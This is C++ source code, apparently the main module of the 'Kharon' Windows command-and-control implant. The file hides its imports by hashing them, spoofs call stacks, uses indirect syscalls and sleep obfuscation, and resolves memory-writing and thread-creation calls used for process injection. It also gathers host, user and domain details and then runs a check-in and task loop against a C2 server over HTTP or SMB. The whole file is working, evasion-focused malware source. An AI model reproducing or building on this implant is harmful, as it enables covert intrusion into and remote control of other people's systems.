#include <Kharon.h>

using namespace Root;

EXTERN_C DECLFN auto Main(
    _In_ UPTR Argument
) -> VOID {
    Kharon Kh;

    Crypt     KhCrypt( &Kh );
    Spoof     KhSpoof( &Kh );
    Coff      KhCoff( &Kh );
    HwbpEng   KhHwbp( &Kh );
    Syscall   KhSyscall( &Kh );
    Socket    KhSocket( &Kh );
    Jobs      KhJobs( &Kh );
    Useful    KhUseful( &Kh );
    Dotnet    KhDotnet( &Kh );
    Library   KhLibrary( &Kh );
    Token     KhToken( &Kh );
    Heap      KhHeap( &Kh );
    Process   KhProcess( &Kh );
    Memory    KhMemory( &Kh );
    Thread    KhThread( &Kh );
    Task      KhTask( &Kh );
    Transport KhTransport( &Kh );
    Package   KhPackage( &Kh );
    Parser    KhParser( &Kh );
    Injection KhInjection( &Kh );
    Mask      KhMask( &Kh );

    Kh.InitCrypt( &KhCrypt );
    Kh.InitSpoof( &KhSpoof );
    Kh.InitCoff( &KhCoff );
    Kh.InitMemory( &KhMemory );
    Kh.InitHwbp( &KhHwbp );
    Kh.InitSyscall( &KhSyscall );
    Kh.InitSocket( &KhSocket );
    Kh.InitJobs( &KhJobs );
    Kh.InitUseful( &KhUseful );
    Kh.InitDotnet( &KhDotnet );
    Kh.InitHeap( &KhHeap );
    Kh.InitLibrary( &KhLibrary );
    Kh.InitToken( &KhToken );
    Kh.InitInjection( &KhInjection );
    Kh.InitMask( &KhMask );
    Kh.InitProcess( &KhProcess );
    Kh.InitTask( &KhTask );
    Kh.InitTransport( &KhTransport );
    Kh.InitThread( &KhThread );
    Kh.InitPackage( &KhPackage );
    Kh.InitParser( &KhParser );

    Kh.Init();

    Kh.Start( Argument );

    return;
}

DECLFN Kharon::Kharon( VOID ) {
    if ( this->Session.Base.Start ) return;

    /* ========= [ get base ] ========= */
    this->Session.Base.Start  = StartPtr();
    this->Session.Base.Length = ( EndPtr() - this->Session.Base.Start );

    /* ========= [ init modules and funcs ] ========= */
    this->Krnl32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "kernel32.dll" ) );
    this->KrnlBase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "kernelbase.dll" ) );
    this->Ntdll.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ntdll.dll" ) );

    RSL_IMP( Ntdll  );
    RSL_IMP( Krnl32 );
    RSL_IMP( KrnlBase );
}

auto DECLFN Kharon::Init(
    VOID
) -> void {
    /* ========= [ set global kharon instance ] ========= */
    
    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;

    /* ========= [ init modules and funcs ] ========= */
    this->Mscoree.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "mscoree.dll" ) );
    this->Advapi32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "advapi32.dll" ) );
    this->Wininet.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "wininet.dll" ) );
    this->Oleaut32.Handle  = LdrLoad::Module( Hsh::Str<CHAR>( "oleaut32.dll" ) );
    this->User32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "user32.dll" ) );
    this->Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
    this->Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
    this->Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
    this->Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );

    /* ========= [ calculate stack for spoof ] ========= */
    this->Spf->Setup.First.Size  = this->Spf->StackSizeWrapper( this->Spf->Setup.First.Ptr );
    this->Spf->Setup.Second.Size = this->Spf->StackSizeWrapper( this->Spf->Setup.Second.Ptr );

    if ( ! this->Mscoree.Handle   ) this->Mscoree.Handle   = this->Lib->Load( "mscoree.dll" );
    if ( ! this->Advapi32.Handle  ) this->Advapi32.Handle  = this->Lib->Load( "advapi32.dll" );
    if ( ! this->Wininet.Handle   ) this->Wininet.Handle   = this->Lib->Load( "wininet.dll" );
    if ( ! this->Oleaut32.Handle  ) this->Oleaut32.Handle  = this->Lib->Load( "oleaut32.dll" );
    if ( ! this->User32.Handle    ) this->User32.Handle    = this->Lib->Load( "user32.dll" );
    if ( ! this->Shell32.Handle   ) this->Shell32.Handle   = this->Lib->Load( "shell32.dll" );
    if ( ! this->Cryptbase.Handle ) this->Cryptbase.Handle = this->Lib->Load( "cryptbase.dll" );
    if ( ! this->Ws2_32.Handle    ) this->Ws2_32.Handle    = this->Lib->Load( "ws2_32.dll" );
    if ( ! this->Msvcrt.Handle    ) this->Msvcrt.Handle    = this->Lib->Load( "msvcrt.dll" );

    RSL_IMP( Mscoree );
    RSL_IMP( Advapi32 );
    RSL_IMP( Wininet );
    RSL_IMP( Oleaut32 );
    RSL_IMP( User32 );
    RSL_IMP( Shell32 );
    RSL_IMP( Cryptbase );
    RSL_IMP( Ws2_32 );
    RSL_IMP( Msvcrt );

    this->Ntdll.khRtlFillMemory = ( decltype( this->Ntdll.khRtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );

    KhDbgz( "Library kernel32.dll  Loaded at %p and Functions Resolveds", this->Krnl32.Handle    );
    KhDbgz( "Library ntdll.dll     Loaded at %p and Functions Resolveds", this->Ntdll.Handle     );
    KhDbgz( "Library mscoree.dll   Loaded at %p and Functions Resolveds", this->Mscoree.Handle   );
    KhDbgz( "Library advapi32.dll  Loaded at %p and Functions Resolveds", this->Advapi32.Handle  );
    KhDbgz( "Library wininet.dll   Loaded at %p and Functions Resolveds", this->Wininet.Handle   );
    KhDbgz( "Library Oleaut32.dll  Loaded at %p and Functions Resolveds", this->Oleaut32.Handle  );
    KhDbgz( "Library user32.dll    Loaded at %p and Functions Resolveds", this->User32.Handle    );
    KhDbgz( "Library shell32.dll   Loaded at %p and Functions Resolveds", this->Shell32.Handle   );
    KhDbgz( "Library cryptbase.dll Loaded at %p and Functions Resolveds", this->Cryptbase.Handle );
    KhDbgz( "Library ws2_32.dll    Loaded at %p and Functions Resolveds", this->Ws2_32.Handle    );
    KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );

    /* ========= [ cfg exceptions to sleep obf ] ========= */
    if ( this->Usf->CfgCheck() ) {
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtSetContextThread );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtGetContextThread );
        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtWaitForSingleObject );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.WaitForSingleObjectEx );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.VirtualProtect );
        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.SetEvent );
        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction040 );
        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction041 );
    }

    /* ========= [ syscalls setup ] ========= */
    this->Sys->Ext[Sys::Alloc].Address       = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
    this->Sys->Ext[Sys::Write].Address       = U_PTR( this->Ntdll.NtWriteVirtualMemory );
    this->Sys->Ext[Sys::OpenProc].Address    = U_PTR( this->Ntdll.NtOpenProcess );
    this->Sys->Ext[Sys::OpenThrd].Address    = U_PTR( this->Ntdll.NtOpenThread );
    this->Sys->Ext[Sys::QueueApc].Address    = U_PTR( this->Ntdll.NtQueueApcThread );
    this->Sys->Ext[Sys::Protect].Address     = U_PTR( this->Ntdll.NtProtectVirtualMemory );
    this->Sys->Ext[Sys::CrThread].Address    = U_PTR( this->Ntdll.NtCreateThreadEx );
    this->Sys->Ext[Sys::CrSectn].Address     = U_PTR( this->Ntdll.NtCreateSection );
    this->Sys->Ext[Sys::MapView].Address     = U_PTR( this->Ntdll.NtMapViewOfSection );
    this->Sys->Ext[Sys::Read].Address        = U_PTR( this->Ntdll.NtReadVirtualMemory );
    this->Sys->Ext[Sys::Free].Address        = U_PTR( this->Ntdll.NtFreeVirtualMemory );
    this->Sys->Ext[Sys::GetCtxThrd].Address  = U_PTR( this->Ntdll.NtGetContextThread );
    this->Sys->Ext[Sys::SetCtxThrd].Address  = U_PTR( this->Ntdll.NtSetContextThread );
    this->Sys->Ext[Sys::OpenPrToken].Address = U_PTR( this->Ntdll.NtOpenThreadTokenEx );
    this->Sys->Ext[Sys::OpenThToken].Address = U_PTR( this->Ntdll.NtOpenProcessTokenEx );

    for ( INT i = 0; i < Sys::Last -1; i++ ) {
        this->Sys->Fetch( i );
    }

    /* ========= [ set syscall flags ] ========= */
    this->KH_SYSCALL_FLAGS = 0;

    if ( this->Spf->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_SPOOF;
    if ( this->Sys->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_INDIRECT;

    /* ========= [ key generation to xor heap and package ] ========= */
    for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
        this->Crp->XorKey[i] = (BYTE)Rnd32();
        this->Crp->LokKey[i] = (BYTE)Rnd32();
    }

    /* ========= [ informations collection ] ========= */
    CHAR   cProcessorName[MAX_PATH] = { 0 };

    ULONG  TmpVal       = 0;
    ULONG  TokenInfoLen = 0;
    HANDLE TokenHandle  = nullptr;
    BOOL   Success      = FALSE;
    HKEY   KeyHandle    = nullptr;

    ULONG  ProcBufferSize    = sizeof( cProcessorName );
    PCHAR  cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";

    SYSTEM_INFO     SysInfo   = { 0 };
    MEMORYSTATUSEX  MemInfoEx = { 0 };
    TOKEN_ELEVATION Elevation = { 0 };

    PROCESS_EXTENDED_BASIC_INFORMATION PsBasicInfoEx = { 0 };

    MemInfoEx.dwLength = sizeof( MEMORYSTATUSEX );

    this->Machine.AllocGran = SysInfo.dwAllocationGranularity;
    this->Machine.PageSize  = SysInfo.dwPageSize;

    this->Ntdll.NtQueryInformationProcess( 
        NtCurrentProcess(), ProcessBasicInformation, 
        &PsBasicInfoEx, sizeof( PsBasicInfoEx ), NULL 
    );

    this->Krnl32.GlobalMemoryStatusEx( &MemInfoEx );
    this->Krnl32.GetNativeSystemInfo( &SysInfo );

	if ( 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || 
		SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
	) {
		this->Machine.OsArch = 0x64;
	} else {
		this->Machine.OsArch = 0x86;
	}

    this->Machine.ProcessorsNbr = SysInfo.dwNumberOfProcessors;

    this->Session.ProcessID = HandleToUlong( NtCurrentTeb()->ClientId.UniqueProcess );
    this->Session.ThreadID  = HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread );
    this->Session.ParentID  = HandleToUlong( PsBasicInfoEx.BasicInfo.InheritedFromUniqueProcessId );

    this->Session.ImagePath   = A_PTR( this->Hp->Alloc( MAX_PATH ) );
    this->Session.CommandLine = A_PTR( this->Hp->Alloc( MAX_PATH ) );

    Str::WCharToChar( this->Session.ImagePath, PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->ImagePathName.Buffer ) + 1 );
    Str::WCharToChar( this->Session.CommandLine, PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer, Str::LengthW( PsBasicInfoEx.PebBaseAddress->ProcessParameters->CommandLine.Buffer ) + 1 );

    Success = this->Advapi32.OpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &TokenHandle );
    Success = this->Advapi32.GetTokenInformation( TokenHandle, TokenElevation, &Elevation, sizeof( Elevation ), &TokenInfoLen );

    this->Machine.TotalRAM   = ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) );
    this->Machine.AvalRAM    = ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) );
    this->Machine.UsedRAM    = ( ( MemInfoEx.ullTotalPhys / ( 1024*1024 ) ) - ( MemInfoEx.ullAvailPhys / ( 1024*1024 ) ) );;
    this->Machine.PercentRAM = MemInfoEx.dwMemoryLoad;

    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, NULL, &TmpVal );
    if ( !Success ) {
        this->Machine.CompName = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameDnsHostname, this->Machine.CompName, &TmpVal );
    }

    Success = this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &TmpVal );
    if ( !Success ) {
        this->Machine.DomName = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameDnsDomain, this->Machine.DomName, &TmpVal );
    }

    Success = this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &TmpVal );
    if ( !Success ) {
        this->Machine.NetBios = (PCHAR)this->Hp->Alloc( TmpVal );
        this->Krnl32.GetComputerNameExA( ComputerNameNetBIOS, A_PTR( this->Machine.NetBios ), &TmpVal );
    }

    this->Machine.UserName = (PCHAR)this->Hp->Alloc( TmpVal );
    this->Advapi32.GetUserNameA( this->Machine.UserName, &TmpVal );
    
    this->Advapi32.RegOpenKeyExA( 
        HKEY_LOCAL_MACHINE, cProcessorNameReg,
        0, KEY_READ, &KeyHandle
    );

    this->Advapi32.RegQueryValueExA(
        KeyHandle, "ProcessorNameString", nullptr, nullptr,
        B_PTR( cProcessorName ), &ProcBufferSize
    );

    this->Machine.ProcessorName = (PCHAR)this->Hp->Alloc( ProcBufferSize );
    Mem::Copy( this->Machine.ProcessorName, cProcessorName, ProcBufferSize );
    
    this->Mk->Ctx.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
    this->Mk->Ctx.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );

    KhDbgz( "======== Session Informations ========" );
    KhDbgz( "Agent UUID: %s", this->Session.AgentID );
    KhDbgz( "Image Path: %s", this->Session.ImagePath );
    KhDbgz( "Command Line: %s", this->Session.CommandLine );
    KhDbgz( "Process ID: %d", this->Session.ProcessID );
    KhDbgz( "Parent ID: %d\n", this->Session.ParentID );

    KhDbgz( "======== Machine Informations ========" );
    KhDbgz( "User Name: %s", this->Machine.UserName );
    KhDbgz( "Computer Name: %s", this->Machine.CompName );
    KhDbgz( "NETBIOS: %s", this->Machine.NetBios );
    KhDbgz( "Processor Name: %s", this->Machine.ProcessorName );
    KhDbgz( "Total RAM: %d", this->Machine.TotalRAM );
    KhDbgz( "Aval RAM: %d", this->Machine.AvalRAM );
    KhDbgz( "Used RAM: %d\n", this->Machine.UsedRAM );

    KhDbgz( "======== Transport Informations ========" );
    KhDbgz("profile c2: %X", PROFILE_C2);
#if PROFILE_C2 == PROFILE_WEB
    KhDbgz( "Host: %S", this->Tsp->Web.Host );
    KhDbgz( "Port: %d", this->Tsp->Web.Port );
    KhDbgz( "Endpoint: %S", this->Tsp->Web.EndPoint );
    KhDbgz( "User Agent: %S", this->Tsp->Web.UserAgent );
    KhDbgz( "Headers: %S", this->Tsp->Web.HttpHeaders );
    KhDbgz( "Secure: %s", this->Tsp->Web.Secure ? "TRUE" : "FALSE" );
    KhDbgz( "Proxy Enabled: %s", this->Tsp->Web.ProxyEnabled ? "TRUE" : "FALSE" );
    KhDbgz( "Proxy URL: %S", this->Tsp->Web.ProxyUrl );
#endif
#if PROFILE_C2 == PROFILE_SMB
    KhDbgz( "SMB Pipe Name: %s", this->Tsp->Pipe.Name );
#endif

    KhDbgz( "Collected informations and setup agent" );

    return;
}

auto DECLFN Kharon::Start( 
    _In_ UPTR Argument 
) -> VOID {
    KhDbgz( "Initializing the principal routine" );

    //
    // do checkin routine (request + validate connection)
    //

    this->Tsp->Checkin();

    do {            
        //
        // use the wrapper sleep function to run the 
        //
        this->Mk->Main( this->Session.SleepTime );

        //
        // kill date check and perform routine
        //
        this->Usf->CheckKillDate();
   
        //
        // start the dispatcher task routine
        //
        this->Tk->Dispatcher();
    } while( 1 );
}